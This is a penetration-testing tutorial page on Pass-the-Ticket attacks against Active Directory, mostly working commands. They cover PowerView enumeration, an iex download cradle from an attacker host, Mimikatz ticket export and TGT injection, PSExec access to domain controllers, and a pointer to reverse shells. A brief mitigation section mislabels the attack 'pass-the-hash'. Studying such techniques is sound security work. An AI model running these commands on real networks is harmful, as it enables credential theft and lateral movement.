# Pass-the-Ticket

Pass the Ticket is a credential theft technique that enables adversaries to use stolen Kerberos tickets to authenticate to resources (e.g, file shares and other computers) as a user without having to compromise that user's password.\
Adversaries often use this technique to move laterally through an organization's network to hunt for opportunities to escalate their privileges or fulfil their mission.&#x20;

#### Methods

* Tickets enumeration
* Capturing Kerberos tickets for valid accounts&#x20;
* Reusing the ticket
* Discovering privileges of the stolen ticket

## Initial enumeration

Check machines within the Active Directory Domain,  where the current user is a local administrator.

```powershell
powershell -ep bypass
. .\PowerView.ps1

Find-LocalAdminAccess

# enter in the session
Enter-PSSession $PREVIOUS_RESULT_COMPUTER
```

Now, check the privilege that we have in the machine with this command:

Copy

```powershell
whoami /all
```

Then, we have to transfer mimikatz.exe or Invoke-Mimikatz.ps1 into target machine.

{% code title="Linux -> Windows Target" %}
```powershell
# into linux
python3 -m http.server 80 

# Download files from windows target
iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
```
{% endcode %}

<pre class="language-powershell" data-title="Windows -> Windows Target"><code class="lang-powershell"># Start a HTTP File Server (HFS) into a Windows machine with .exe
# https://www.rejetto.com/hfs/

# Download files from windows target
<strong>iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
</strong></code></pre>

## Get Kerberos tickets

### With Mimikatz

Export all tickets from local memory

{% code title="Invoke-Mimikatz.ps1" %}
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
{% endcode %}

{% code title="mimikatz.exe" %}
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
```
{% endcode %}

This is the output files:

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

The kerberos ticket is the file within "_krgtgt_" in the name.&#x20;

### Reusing the ticket

In this step, the attacker employs the **Mimikatz** command `kerberos::ptt` to insert the obtained TGT into their own session, resulting in their session taking on the **identity** and **permissions** of the stolen TGT for future access to resources **without knowing the plaintext credentials**.

{% code title="Invoke-Mimikatz.ps1" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt $KIRBI_FILE_NAME"'
```
{% endcode %}

{% code title="mimikatz.exe" %}
```powershell
mimikatz.exe "kerberos::ptt $KIRBI_FILE_NAME"
```
{% endcode %}

The above commands is used to insert the Kerberos Ticket Granting Ticket (TGT) stored in the corresponding .kirbi file into the current session.

To make sure that the right ticket was injected, an adversary can use the “`kerberos::list`” Mimikatz command.

```powershell
mimikatz.exe "kerberos::list"
klist
```

### Discovering privileges of the stolen ticket

#### Domain Controller access check

{% code title="PowerView commands" %}
```powershell
Get-Domain # view the DC address

ls \\$DOMAIN_CONTROLLER_DOMAIN\c$ # check if we have access to DC
PSExec \\$DOMAIN_CONTROLLER_DOMAIN powershell.exe
```
{% endcode %}

If we have the privilege to access into Domain controller we can use:

```
Enter-PSSession $DC_NAME
```

Or create a bind/rev shell into domain controller with NC.

{% content-ref url="../../executive-pt/post-exploitation/shells.md" %}
[shells.md](../../executive-pt/post-exploitation/shells.md)
{% endcontent-ref %}

#### Futher info of stolen account

{% code title="PowerShell" %}
```powershell
net user Alice /domain
```
{% endcode %}







## Mitigation Technique

Effective measures to counter pass-the-hash attacks concentrate on making tickets more difficult to steal and limiting the potential impact of a stolen ticket. One such measure is to utilize Microsoft's Windows Defender Credential Guard. This technology, which was introduced in Windows 10 and Windows Server 2016, leverages virtualization to secure credential storage and provide access only to trusted processes.&#x20;

Another important step is to limit the number of endpoints where users have administrative privileges. This significantly reduces the risk of an attacker using a stolen ticket for lateral movement. It is also important to avoid granting administrative privileges across security boundaries, as this greatly reduces the risk of an attacker using a stolen ticket to escalate their privileges.



